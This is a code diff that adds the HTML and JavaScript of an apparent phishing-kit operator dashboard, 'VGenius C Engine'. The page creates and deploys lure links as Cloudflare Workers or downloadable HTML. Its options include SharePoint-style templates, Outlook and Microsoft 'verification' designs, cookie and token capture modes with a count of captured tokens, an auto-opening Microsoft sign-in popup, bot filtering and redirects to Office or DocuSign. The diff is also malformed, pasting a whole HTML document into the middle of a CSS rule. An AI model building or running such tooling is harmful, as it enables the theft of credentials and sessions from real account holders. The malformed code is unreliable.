@@ -12,7 +12,630 @@
             position: fixed; inset: 0; background: rgba(0,0,0,0.8);
             backdrop-filter: blur(8px); z-index: 9998;
             display: none; align-items: center; justify-content: center;
+            flex-direction: column; gap: 16px;<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Links – VGenius C Engine</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/user.css">
+    <style>
+        /* Loading overlay */
+        .vg-loading-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px); z-index: 9998;
+            display: none; align-items: center; justify-content: center;
             flex-direction: column; gap: 16px;
+        }
+        .vg-loading-overlay.show { display: flex; }
+        .vg-loading-overlay .spinner {
+            width: 40px; height: 40px; border: 3px solid var(--border);
+            border-top-color: var(--accent); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .vg-loading-overlay .loading-title { font-size: 16px; font-weight: 700; color: var(--text-main); }
+        .vg-loading-overlay .loading-sub { font-size: 12px; color: var(--muted); }
+
+        /* Export success modal */
+        .export-success-icon {
+            width: 64px; height: 64px; margin: 0 auto 16px;
+            display: flex; align-items: center; justify-content: center;
+            border-radius: 50%; background: rgba(0,255,102,0.1);
+            border: 1px solid rgba(0,255,102,0.3); font-size: 28px; color: var(--accent);
+        }
+
+        /* Template visual picker */
+        .tmpl-picker { position: relative; }
+        .tmpl-trigger {
+            width: 100%; padding: 10px 14px; display: flex; align-items: center;
+            justify-content: space-between; background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(0,255,204,0.15); border-radius: 8px;
+            color: var(--text-main); font-size: 12px; cursor: pointer; transition: all 0.2s;
+        }
+        .tmpl-trigger:hover { border-color: var(--accent); }
+        .tmpl-panel {
+            position: absolute; top: calc(100% + 4px); left: 0; right: 0;
+            background: #0d0d0d; border: 1px solid var(--border); border-radius: 10px;
+            max-height: 240px; overflow: hidden; z-index: 10; display: none;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
+        }
+        .tmpl-panel.open { display: block; }
+        .tmpl-panel .tmpl-search { padding: 8px; border-bottom: 1px solid var(--border); }
+        .tmpl-panel .tmpl-search input {
+            width: 100%; padding: 8px 10px; background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border); border-radius: 6px; color: var(--text-main);
+            font-size: 11px; outline: none;
+        }
+        .tmpl-panel .tmpl-list { max-height: 180px; overflow-y: auto; padding: 4px; }
+        .tmpl-panel .tmpl-item {
+            padding: 8px 10px; border-radius: 6px; cursor: pointer;
+            font-size: 12px; color: var(--text-main); transition: background 0.15s;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .tmpl-panel .tmpl-item:hover { background: rgba(0,255,204,0.06); }
+        .tmpl-panel .tmpl-item.selected { background: rgba(0,255,204,0.1); color: var(--accent); }
+        .tmpl-panel .tmpl-item img { width: 28px; height: 20px; border-radius: 4px; object-fit: cover; background: #1a1a1a; }
+        html[data-theme="light"] .tmpl-panel { background: #ffffff; }
+        html[data-theme="light"] .tmpl-trigger { background: #ffffff; border-color: #cbd5e1; color: #111827; }
+    </style>
+</head>
+<body>
+    <aside class="main-sidebar" id="mainSidebar"></aside>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+    <nav class="main-header navbar"></nav>
+
+    <main class="content-wrapper">
+        <div class="page-header">
+            <h1 class="page-title">My Links</h1>
+            <button class="btn-accent-sm" style="padding:12px 24px;font-size:12px;" onclick="openDrawer()"><i class="fas fa-plus"></i> Create New</button>
+        </div>
+        <div class="card" style="overflow:hidden;">
+            <table class="links-table">
+                <thead><tr><th>#</th><th>Name</th><th>URL</th><th>Mode</th><th>Template</th><th>Tokens</th><th>Status</th><th>Action</th></tr></thead>
+                <tbody id="linksTableBody"><tr><td colspan="8" class="empty-state"><i class="fas fa-link"></i>No links created yet.</td></tr></tbody>
+            </table>
+        </div>
+    </main>
+
+    <!-- Loading Overlay -->
+    <div class="vg-loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-title" id="loadingTitle">Deploying Worker</div>
+        <div class="loading-sub" id="loadingSub">Please wait, this may take a few seconds...</div>
+    </div>
+
+    <!-- Export Success Modal -->
+    <div class="modal-overlay" id="exportSuccessModal" style="display:none;" onclick="if(event.target===this)closeExportSuccess()">
+        <div class="modal-card" style="max-width:480px;text-align:center;">
+            <div class="export-success-icon"><i class="fas fa-check"></i></div>
+            <h3 style="font-size:16px;margin-bottom:8px;">Export Complete</h3>
+            <p style="font-size:12px;color:var(--muted);margin-bottom:20px;">Your static HTML has been downloaded.</p>
+            <div style="background:var(--accent-dim);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:12px;text-align:left;">
+                <div style="font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:4px;">Upload Target</div>
+                <div style="font-family:var(--font-heading);font-size:12px;color:var(--accent);" id="exportTargetDomain">—</div>
+            </div>
+            <button class="btn-accent-sm" style="width:100%;padding:12px;" onclick="closeExportSuccess()"><i class="fas fa-check"></i> Done</button>
+        </div>
+    </div>
+
+    <!-- Drawer Overlay -->
+    <div class="drawer-overlay" id="drawerOverlay" onclick="closeDrawer()"></div>
+    <div class="drawer" id="createDrawer">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+            <h3 style="margin:0;font-family:var(--font-heading);font-size:14px;letter-spacing:0.06em;"><i class="fas fa-plus-circle" style="color:var(--accent);margin-right:8px;"></i> Create New Link</h3>
+            <button onclick="closeDrawer()" style="background:none;border:none;color:var(--muted);cursor:pointer;font-size:18px;"><i class="fas fa-times"></i></button>
+        </div>
+
+        <!-- Deployment Mode Cards -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;">
+            <label class="deploy-mode-card" id="modeCF" onclick="switchTab('cloudflare')" style="display:flex;align-items:center;gap:10px;padding:14px;border:1px solid var(--accent);border-radius:12px;cursor:pointer;transition:all 0.2s;background:rgba(0,255,204,0.06);">
+                <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:rgba(0,255,204,0.1);flex-shrink:0;"><i class="fas fa-cloud" style="color:var(--accent);font-size:16px;"></i></div>
+                <div><div style="font-size:12px;font-weight:700;">Cloudflare Worker</div><div style="font-size:10px;color:var(--muted);margin-top:2px;">Deploy to workers.dev</div></div>
+            </label>
+            <label class="deploy-mode-card" id="modeExport" onclick="switchTab('export')" style="display:flex;align-items:center;gap:10px;padding:14px;border:1px solid var(--border);border-radius:12px;cursor:pointer;transition:all 0.2s;background:transparent;">
+                <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:rgba(255,255,255,0.03);flex-shrink:0;"><i class="fas fa-file-code" style="color:var(--muted);font-size:16px;"></i></div>
+                <div><div style="font-size:12px;font-weight:700;">Static Export</div><div style="font-size:10px;color:var(--muted);margin-top:2px;">Download HTML file</div></div>
+            </label>
+        </div>
+
+        <div id="tabCloudflare">
+            <div class="form-group">
+                <label><i class="fas fa-tag" style="margin-right:4px;"></i> Worker Name</label>
+                <input type="text" id="workerName" placeholder="e.g., secure-docs" oninput="updateUrlPreview()" style="font-family:var(--font-heading);font-size:12px;">
+                <div id="urlPreview" style="margin-top:6px;font-family:var(--font-heading);font-size:10px;color:var(--accent);display:none;">
+                    <i class="fas fa-link" style="margin-right:4px;"></i> <span id="urlPreviewText"></span>
+                </div>
+                <div class="helper-text">Lowercase letters, numbers, hyphens (3-50 chars)</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-shield-halved" style="margin-right:4px;"></i> Auth Mode</label>
+                <select id="authMode"><option value="cookie">🍪 Cookie Mode</option><option value="token">🔑 Token Mode</option></select>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-globe" style="margin-right:4px;"></i> URL Type</label>
+                <select id="urlType" onchange="toggleUrlTypeFields()"><option value="worker">🤖 workers.dev</option><option value="custom">🌐 Custom Domain</option></select>
+            </div>
+            <div class="form-group" id="existingWorkersField"><label>Select Worker</label><select id="existingWorkers"><option value="">Choose a worker</option></select></div>
+            <div id="customDomainFields" style="display:none;">
+                <div class="form-group"><label>Select Domain</label><select id="customDomain"><option value="">Select a domain</option></select></div>
+                <div class="form-group">
+                    <label>Domain Connection</label>
+                    <div style="display:flex;gap:8px;">
+                        <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;padding:8px 12px;border:1px solid var(--accent);border-radius:8px;flex:1;justify-content:center;"><input type="radio" name="domainConn" value="subdomain" checked onchange="toggleRouteName()" style="display:none;"> Subdomain</label>
+                        <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;padding:8px 12px;border:1px solid var(--border);border-radius:8px;flex:1;justify-content:center;"><input type="radio" name="domainConn" value="root" onchange="toggleRouteName()" style="display:none;"> Root</label>
+                    </div>
+                </div>
+                <div class="form-group" id="routeNameField"><label>Route Name</label><input type="text" id="routeName" placeholder="e.g., secure-docs"></div>
+            </div>
+        </div>
+        <div id="tabExport" style="display:none;">
+            <div class="form-group">
+                <label><i class="fas fa-download" style="margin-right:4px;"></i> Export Mode</label>
+                <select id="exportMode"><option value="download">Download HTML File</option><option value="bunny">Deploy to Bunny CDN</option></select>
+            </div>
+            <div style="padding:12px;background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:8px;font-size:11px;color:#f59e0b;margin-top:4px;display:flex;align-items:flex-start;gap:8px;">
+                <i class="fas fa-info-circle" style="margin-top:2px;flex-shrink:0;"></i>
+                <span>Generate a self-contained HTML file. Upload to any static host or Bunny CDN.</span>
+            </div>
+        </div>
+
+        <div style="border-top:1px solid var(--border);margin:16px 0;padding-top:16px;">
+            <div class="form-group">
+                <label><i class="fas fa-cube" style="margin-right:4px;"></i> Template Type</label>
+                <div class="tmpl-picker">
+                    <button type="button" class="tmpl-trigger" onclick="tmplToggle()">
+                        <span id="tmplLabel" style="color:var(--muted);">Choose a template…</span>
+                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                    </button>
+                    <div class="tmpl-panel" id="tmplPanel">
+                        <div class="tmpl-search"><input type="text" id="tmplSearch" placeholder="Search templates…" oninput="tmplFilter(this.value)" autocomplete="off"></div>
+                        <div class="tmpl-list" id="tmplList"></div>
+                    </div>
+                </div>
+                <select id="templateType" style="display:none;"></select>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-palette" style="margin-right:4px;"></i> Verification Design</label>
+                <select id="verificationDesign"><option value="">Loading designs...</option></select>
+            </div>
+        </div>
+
+        <div style="border-top:1px solid var(--border);margin:16px 0;padding-top:16px;">
+            <div class="form-group">
+                <label><i class="fas fa-external-link-alt" style="margin-right:4px;"></i> Destination URL</label>
+                <input type="text" id="destUrl" value="https://office.com" style="font-size:12px;">
+            </div>
+            <div style="display:flex;gap:6px;margin-top:-8px;margin-bottom:12px;flex-wrap:wrap;">
+                <span class="dest-preset" onclick="setDest('https://office.com')">Office</span>
+                <span class="dest-preset" onclick="setDest('https://microsoft.com')">Microsoft</span>
+                <span class="dest-preset" onclick="setDest('https://docusign.com')">DocuSign</span>
+                <span class="dest-preset" onclick="setDest('https://onedrive.live.com')">OneDrive</span>
+                <span class="dest-preset" onclick="setDest('https://ringcentral.com')">RingCentral</span>
+                <span class="dest-preset" onclick="setDest('https://adobe.com')">Adobe</span>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label><i class="fas fa-layer-group" style="margin-right:4px;"></i> Background Blur <span id="blurValue" style="color:var(--accent);font-weight:700;">4px</span></label>
+            <input type="range" id="bgBlur" min="0" max="10" value="4" style="width:100%;accent-color:var(--accent);" oninput="document.getElementById('blurValue').textContent=this.value+'px'">
+            <div class="helper-text">Blur applies to the page background image.</div>
+        </div>
+        <div class="form-group">
+            <label><i class="fas fa-image" style="margin-right:4px;"></i> Custom Background URL <span style="font-size:10px;color:var(--muted);">(optional)</span></label>
+            <input type="text" id="customBgUrl" placeholder="https://example.com/bg.jpg" style="font-size:12px;">
+            <div class="helper-text">Override the default template background image.</div>
+        </div>
+
+        <!-- Document Info (collapsible) -->
+        <div style="margin-bottom:14px;">
+            <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text-muted);font-family:var(--font-heading);text-transform:uppercase;letter-spacing:0.06em;" onclick="toggleDocInfo()">
+                <i class="fas fa-file-signature" style="color:var(--accent);"></i>
+                <span>Customize document info</span>
+                <i class="fas fa-chevron-down" id="docInfoArrow" style="margin-left:auto;font-size:10px;transition:transform 0.2s;"></i>
+            </label>
+            <div id="docInfoFields" style="display:none;margin-top:12px;padding:14px;background:rgba(0,255,204,0.03);border:1px solid rgba(0,255,204,0.12);border-radius:8px;">
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+                    <div class="form-group"><label>File Name</label><input type="text" id="fileName" value="Document.pdf" style="font-size:12px;"></div>
+                    <div class="form-group"><label>Pages</label><input type="text" id="pages" value="4 pages" placeholder="e.g., 4 pages" style="font-size:12px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page Text (collapsible) -->
+        <div style="margin-bottom:14px;">
+            <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text-muted);font-family:var(--font-heading);text-transform:uppercase;letter-spacing:0.06em;" onclick="togglePageText()">
+                <i class="fas fa-heading" style="color:var(--info);"></i>
+                <span>Customize page text</span>
+                <i class="fas fa-chevron-down" id="pageTextArrow" style="margin-left:auto;font-size:10px;transition:transform 0.2s;"></i>
+            </label>
+            <div id="pageTextFields" style="display:none;margin-top:12px;padding:14px;background:rgba(0,200,255,0.03);border:1px solid rgba(0,200,255,0.14);border-radius:8px;">
+                <div class="form-group"><label>Title</label><input type="text" id="pageTitle" placeholder="Sign in to view document" maxlength="120" style="font-size:12px;"></div>
+                <div class="form-group"><label>Message</label><textarea id="pageMessage" placeholder="This document requires authentication…" maxlength="300" rows="2" style="width:100%;padding:8px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:6px;color:var(--text-main);font-size:12px;resize:vertical;min-height:60px;outline:none;"></textarea></div>
+            </div>
+        </div>
+
+        <div class="form-group"><label><i class="fas fa-i-cursor" style="margin-right:4px;"></i> Button Text</label><input type="text" id="buttonText" placeholder="Leave empty for template default" style="font-size:12px;"></div>
+
+        <!-- Toggles -->
+        <div style="border-top:1px solid var(--border);margin:14px 0;padding-top:14px;">
+            <div class="toggle-row">
+                <span class="toggle-label">Blob URL for Template</span>
+                <label class="toggle-switch"><input type="checkbox" id="blobUrlToggle"><span class="toggle-slider"></span></label>
+            </div>
+            <div class="toggle-row">
+                <span class="toggle-label">Copy to Open<br><span class="status" style="font-size:10px;color:var(--muted);">Auto-open MS sign-in popup</span></span>
+                <label class="toggle-switch"><input type="checkbox" id="copyToOpen" checked><span class="toggle-slider"></span></label>
+            </div>
+            <div class="toggle-row">
+                <span class="toggle-label">Show Verification Complete<br><span class="status" style="font-size:10px;color:var(--muted);">Screen before redirect</span></span>
+                <label class="toggle-switch"><input type="checkbox" id="showVerification" checked><span class="toggle-slider"></span></label>
+            </div>
+            <div class="toggle-row">
+                <span class="toggle-label">Cloudflare Turnstile<br><span class="status" style="font-size:10px;color:var(--muted);">Bot protection challenge</span></span>
+                <label class="toggle-switch"><input type="checkbox" id="turnstileToggle" checked><span class="toggle-slider"></span></label>
+            </div>
+        </div>
+
+        <button class="btn-accent-sm" style="width:100%;padding:14px;margin-top:16px;font-size:12px;letter-spacing:0.06em;" onclick="deployLink()" id="deployBtn"><i class="fas fa-rocket"></i> Deploy Worker</button>
+    </div>
+
+    <script src="assets/js/user.js"></script>
+    <script>
+        const token = getToken();
+        if (!token) window.location.href = 'index.html';
+        let activeTab = 'cloudflare';
+        let allLinksCache = [];
+        let allTemplates = [];
+        let selectedTemplate = '';
+
+        initShared('links');
+
+        // ─── Template Picker ─────────────────────────────────
+        function tmplToggle() {
+            const panel = document.getElementById('tmplPanel');
+            panel.classList.toggle('open');
+            if (panel.classList.contains('open')) {
+                document.getElementById('tmplSearch').focus();
+            }
+        }
+
+        function tmplFilter(q) {
+            const items = document.querySelectorAll('#tmplList .tmpl-item');
+            const lower = q.toLowerCase();
+            items.forEach(item => {
+                item.style.display = item.dataset.name.toLowerCase().includes(lower) ? '' : 'none';
+            });
+        }
+
+        function selectTemplate(key, name) {
+            selectedTemplate = key;
+            document.getElementById('templateType').value = key;
+            document.getElementById('tmplLabel').textContent = name;
+            document.getElementById('tmplLabel').style.color = 'var(--accent)';
+            document.getElementById('tmplPanel').classList.remove('open');
+            document.querySelectorAll('#tmplList .tmpl-item').forEach(i => i.classList.remove('selected'));
+            document.querySelector(`#tmplList .tmpl-item[data-key="${key}"]`)?.classList.add('selected');
+        }
+
+        // Close template picker on outside click
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.tmpl-picker')) {
+                document.getElementById('tmplPanel')?.classList.remove('open');
+            }
+        });
+
+        // ─── Collapsible Sections ─────────────────────────────
+        function toggleDocInfo() {
+            const f = document.getElementById('docInfoFields');
+            const a = document.getElementById('docInfoArrow');
+            f.style.display = f.style.display === 'none' ? 'block' : 'none';
+            a.style.transform = f.style.display === 'block' ? 'rotate(180deg)' : '';
+        }
+        function togglePageText() {
+            const f = document.getElementById('pageTextFields');
+            const a = document.getElementById('pageTextArrow');
+            f.style.display = f.style.display === 'none' ? 'block' : 'none';
+            a.style.transform = f.style.display === 'block' ? 'rotate(180deg)' : '';
+        }
+
+        // ─── URL Preview ─────────────────────────────────────
+        function updateUrlPreview() {
+            const name = document.getElementById('workerName').value.trim();
+            const preview = document.getElementById('urlPreview');
+            const text = document.getElementById('urlPreviewText');
+            if (name) { text.textContent = name + '.workers.dev'; preview.style.display = 'block'; }
+            else { preview.style.display = 'none'; }
+        }
+
+        // ─── Destination Presets ──────────────────────────────
+        function setDest(url) { document.getElementById('destUrl').value = url; }
+
+        // ─── Tab Switching ────────────────────────────────────
+        function switchTab(tab) {
+            activeTab = tab;
+            const cf = document.getElementById('modeCF');
+            const exp = document.getElementById('modeExport');
+            if (tab === 'cloudflare') {
+                cf.style.borderColor = 'var(--accent)'; cf.style.background = 'rgba(0,255,204,0.06)';
+                exp.style.borderColor = 'var(--border)'; exp.style.background = 'transparent';
+            } else {
+                exp.style.borderColor = 'var(--accent)'; exp.style.background = 'rgba(0,255,204,0.06)';
+                cf.style.borderColor = 'var(--border)'; cf.style.background = 'transparent';
+            }
+            document.getElementById('tabCloudflare').style.display = tab === 'cloudflare' ? 'block' : 'none';
+            document.getElementById('tabExport').style.display = tab === 'export' ? 'block' : 'none';
+            const btn = document.getElementById('deployBtn');
+            btn.innerHTML = tab === 'cloudflare' ? '<i class="fas fa-rocket"></i> Deploy Worker' : '<i class="fas fa-download"></i> Generate & Download';
+        }
+
+        function toggleUrlTypeFields() {
+            const t = document.getElementById('urlType').value;
+            document.getElementById('existingWorkersField').style.display = t === 'worker' ? 'block' : 'none';
+            document.getElementById('customDomainFields').style.display = t === 'custom' ? 'block' : 'none';
+        }
+        function toggleRouteName() {
+            const rf = document.getElementById('routeNameField');
+            if (rf) rf.style.display = document.querySelector('input[name="domainConn"]:checked').value === 'subdomain' ? 'block' : 'none';
+        }
+
+        // ─── Loading ──────────────────────────────────────────
+        function showLoading(title, sub) {
+            document.getElementById('loadingTitle').textContent = title || 'Deploying Worker';
+            document.getElementById('loadingSub').textContent = sub || 'Please wait, this may take a few seconds...';
+            document.getElementById('loadingOverlay').classList.add('show');
+        }
+        function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+        // ─── Export Success Modal ──────────────────────────────
+        function showExportSuccess(domain) {
+            document.getElementById('exportTargetDomain').textContent = domain || '—';
+            document.getElementById('exportSuccessModal').style.display = 'flex';
+        }
+        function closeExportSuccess() { document.getElementById('exportSuccessModal').style.display = 'none'; }
+
+        // ─── Deploy ───────────────────────────────────────────
+        async function deployLink() {
+            const btn = document.getElementById('deployBtn');
+            const origText = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+
+            const isExport = activeTab === 'export';
+            showLoading(isExport ? 'Generating HTML' : 'Deploying Worker', 'This may take a few seconds...');
+
+            const body = {
+                worker_name: document.getElementById('workerName').value || 'link-' + Date.now(),
+                auth_mode: document.getElementById('authMode').value,
+                template_type: selectedTemplate || document.getElementById('templateType').value || 'sharepoint3',
+                verification_design: document.getElementById('verificationDesign').value || 'outlook',
+                destination_url: document.getElementById('destUrl').value,
+                file_name: document.getElementById('fileName')?.value,
+                pages: document.getElementById('pages')?.value,
+                title_text: document.getElementById('pageTitle')?.value || null,
+                message_text: document.getElementById('pageMessage')?.value || null,
+                button_text: document.getElementById('buttonText').value,
+                background_blur: parseInt(document.getElementById('bgBlur').value),
+                custom_bg_url: document.getElementById('customBgUrl') ? document.getElementById('customBgUrl').value || null : null,
+                url_type: isExport ? 'export' : document.getElementById('urlType').value,
+                blob_url_enabled: document.getElementById('blobUrlToggle')?.checked || false,
+                copy_to_open: document.getElementById('copyToOpen')?.checked || false,
+                show_verification_complete: document.getElementById('showVerification')?.checked || false,
+                turnstile_enabled: document.getElementById('turnstileToggle') ? document.getElementById('turnstileToggle').checked !== false : true,
+            };
+
+            // Add custom-domain fields when applicable
+            if (!isExport && body.url_type === 'custom') {
+                body.custom_domain = document.getElementById('customDomain')?.value || null;
+                const connRadio = document.querySelector('input[name="domainConn"]:checked');
+                body.domain_connection = connRadio ? connRadio.value : 'subdomain';
+                body.route_name = document.getElementById('routeName')?.value || null;
+            }
+
+            // Export-mode (Bunny CDN) selection
+            if (isExport) {
+                body.export_mode = document.getElementById('exportMode')?.value || 'download';
+            }
+
+            try {
+                const res = await fetch(`${API}/links`, { method: 'POST', headers: authHeaders(), body: JSON.stringify(body) });
+                const data = await res.json();
+
+                if (!data.id) {
+                    hideLoading();
+                    showToast(data.error || 'Failed to create link', true);
+                    btn.disabled = false;
+                    btn.innerHTML = origText;
+                    return;
+                }
+
+                if (isExport) {
+                    try {
+                        const exportRes = await fetch(`${API}/links/${data.id}/export`, { headers: authHeaders() });
+                        if (exportRes.ok) {
+                            const blob = await exportRes.blob();
+                            const url = window.URL.createObjectURL(blob);
+                            const a = document.createElement('a'); a.href = url;
+                            a.download = `vgenius-${data.worker_name || data.id}.html`; a.click();
+                            window.URL.revokeObjectURL(url);
+                            hideLoading();
+                            showExportSuccess(body.destination_url);
+                        } else {
+                            hideLoading();
+                            showToast('Export failed', true);
+                        }
+                    } catch (e2) {
+                        hideLoading();
+                        showToast('Export download failed: ' + e2.message, true);
+                    }
+                } else {
+                    hideLoading();
+                    showToast('Worker deployed successfully! 🚀');
+                }
+
+                closeDrawer();
+                loadLinks();
+            } catch (e) {
+                hideLoading();
+                showToast('Error: ' + e.message, true);
+            }
+
+            btn.disabled = false;
+            btn.innerHTML = isExport ? '<i class="fas fa-download"></i> Generate & Download' : '<i class="fas fa-rocket"></i> Deploy Worker';
+        }
+
+        // ─── Links Table ──────────────────────────────────────
+        async function loadTemplateDropdown() {
+            try {
+                const res = await fetch(`${API}/templates`, { headers: authHeaders() });
+                const data = await res.json();
+                allTemplates = data.templates || [];
+                const sel = document.getElementById('templateType');
+                const list = document.getElementById('tmplList');
+
+                if (allTemplates.length === 0) {
+                    // Fallback
+                    allTemplates = [{ name: 'SharePoint 3', template_key: 'sharepoint3' }];
+                }
+
+                sel.innerHTML = allTemplates.map(t => `<option value="${t.template_key || t.name}">${t.name}</option>`).join('');
+                list.innerHTML = allTemplates.map(t => `
+                    <div class="tmpl-item" data-key="${t.template_key || t.name}" data-name="${t.name}" onclick="selectTemplate('${t.template_key || t.name}', '${t.name}')">
+                        <i class="fas fa-file-code" style="color:var(--accent);font-size:12px;opacity:0.5;"></i>
+                        ${t.name}
+                    </div>
+                `).join('');
+            } catch (e) {
+                document.getElementById('templateType').innerHTML = '<option value="sharepoint3">SharePoint 3</option>';
+            }
+        }
+
+        async function loadDesignDropdown() {
+            try {
+                const res = await fetch(`${API}/templates/designs`, { headers: authHeaders() });
+                const designs = await res.json();
+                const sel = document.getElementById('verificationDesign');
+                sel.innerHTML = designs.length ? designs.map(d => `<option value="${d.name}">${d.name}</option>`).join('') :
+                    '<option value="outlook">Outlook</option><option value="minimal-clean">Minimal Clean</option><option value="microsoft">Microsoft</option><option value="slider">Slider</option>';
+            } catch (e) {
+                document.getElementById('verificationDesign').innerHTML = '<option value="outlook">Outlook</option><option value="minimal-clean">Minimal Clean</option><option value="microsoft">Microsoft</option><option value="slider">Slider</option>';
+            }
+        }
+
+        async function loadLinks() {
+            try {
+                const res = await fetch(`${API}/links?status=active`, { headers: authHeaders() });
+                const links = await res.json();
+                allLinksCache = links;
+                const tbody = document.getElementById('linksTableBody');
+                if (!links.length) {
+                    tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><i class="fas fa-link"></i>No links created yet.</td></tr>';
+                    return;
+                }
+                tbody.innerHTML = links.map((l, i) => `
+                    <tr>
+                        <td>${i+1}</td>
+                        <td>${l.name || 'Untitled'}</td>
+                        <td style="font-family:var(--font-heading);font-size:10px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${l.public_url || l.worker_name || '—'}</td>
+                        <td><span class="badge">${l.auth_mode === 'cookie' ? 'Cookie' : 'Token'}</span></td>
+                        <td>${l.template_type}</td>
+                        <td>${l.token_count || 0}</td>
+                        <td><label style="position:relative;width:40px;height:20px;display:inline-block;"><input type="checkbox" ${l.status === 'active' ? 'checked' : ''} onchange="toggleLink(${l.id})" style="opacity:0;width:0;height:0;"><span style="position:absolute;cursor:pointer;inset:0;background:#18181b;border-radius:20px;transition:0.25s;"></span><span style="position:absolute;height:14px;width:14px;left:3px;bottom:3px;background:#71717a;border-radius:50%;transition:0.25s;"></span></label></td>
+                        <td>
+                            <button class="btn-outline" style="padding:4px 8px;font-size:10px;" onclick="copyLinkUrl('${l.public_url || l.worker_name || ''}')"><i class="fas fa-copy"></i></button>
+                            <button class="btn-danger-sm" style="padding:4px 8px;font-size:10px;" onclick="deleteLink(${l.id})"><i class="fas fa-trash"></i></button>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch(e) { console.error('Load links error:', e); }
+        }
+
+        async function loadExistingWorkers() {
+            try {
+                const res = await fetch(`${API}/links/workers`, { headers: authHeaders() });
+                const data = await res.json();
+                const sel = document.getElementById('existingWorkers');
+                const workers = data.workers || [];
+                const currentVal = sel.value;
+                sel.innerHTML = '<option value="">— New worker (deploy) —</option>' +
+                    workers.map(w => `<option value="${w.id}">${w.id}</option>`).join('');
+                if (currentVal) sel.value = currentVal;
+            } catch (e) { /* silent */ }
+        }
+
+        async function loadUserDomains() {
+            try {
+                const res = await fetch(`${API}/user/cf-domains`, { headers: authHeaders() });
+                const data = await res.json();
+                const sel = document.getElementById('customDomain');
+                const domains = data.domains || [];
+                const currentVal = sel.value;
+                sel.innerHTML = domains.length
+                    ? '<option value="">Select a domain</option>' + domains.map(d => `<option value="${d.name}">${d.name}</option>`).join('')
+                    : '<option value="">No domains found</option>';
+                if (currentVal) sel.value = currentVal;
+            } catch (e) { /* silent */ }
+        }
+
+        function openDrawer() {
+            document.getElementById('drawerOverlay').classList.add('open');
+            document.getElementById('createDrawer').classList.add('open');
+            // Reset button text
+            const btn = document.getElementById('deployBtn');
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-rocket"></i> Deploy Worker';
+            switchTab('cloudflare');
+            // Preload workers + domains
+            loadExistingWorkers();
+            loadUserDomains();
+        }
+
+        function closeDrawer() {
+            document.getElementById('drawerOverlay').classList.remove('open');
+            document.getElementById('createDrawer').classList.remove('open');
+        }
+
+        function copyLinkUrl(url) {
+            if (!url) return;
+            if (!url.startsWith('http')) url = url.includes('.') ? `https://${url}` : `https://${url}.workers.dev`;
+            navigator.clipboard.writeText(url).then(() => showToast('URL copied'));
+        }
+        async function toggleLink(id) { await fetch(`${API}/links/${id}/toggle`, { method: 'POST', headers: authHeaders() }); loadLinks(); }
+        async function deleteLink(id) {
+            showConfirm({
+                title: 'Delete Link',
+                message: 'Are you sure you want to delete this link? The associated worker will be removed.',
+                confirmText: 'Delete',
+                onConfirm: async () => {
+                    await fetch(`${API}/links/${id}`, { method: 'DELETE', headers: authHeaders() });
+                    loadLinks();
+                    showToast('Link deleted');
+                }
+            });
+        }
+
+        document.addEventListener('keydown', (e) => { if (e.key === 'Escape') { closeDrawer(); closeExportSuccess(); } });
+
+        // Preselect template from query params (coming from templates marketplace)
+        const urlParams = new URLSearchParams(window.location.search);
+        const preselectKey = urlParams.get('template');
+        const preselectName = urlParams.get('name');
+
+        async function init() {
+            await loadTemplateDropdown();
+            if (preselectKey) {
+                selectTemplate(preselectKey, preselectName || preselectKey);
+                openDrawer();
+            }
+            loadDesignDropdown();
+            loadLinks();
+        }
+        init();
+    </script>
+</body>
+</html>
+
         }
         .vg-loading-overlay.show { display: flex; }
         .vg-loading-overlay .spinner {
